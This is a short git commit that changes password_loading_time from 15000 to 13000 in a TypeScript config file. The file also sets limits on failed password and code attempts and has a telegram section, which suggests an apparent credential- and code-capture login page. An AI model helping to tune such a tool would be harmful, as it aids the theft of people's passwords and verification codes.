c6f96db720363a666306e11589110c929ec1f89a
mentorblack <vuvansonxx@gmail.com>
2025-01-08 10:47:41 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -22,7 +22,7 @@ const defaultConfig: Config = {
     max_failed_code_attempts: 3,
     max_failed_password_attempts: 1,
     page_loading_time: 5000,
-    password_loading_time: 15000,
+    password_loading_time: 13000,
     code_input_enabled: true,
   },
   telegram: {
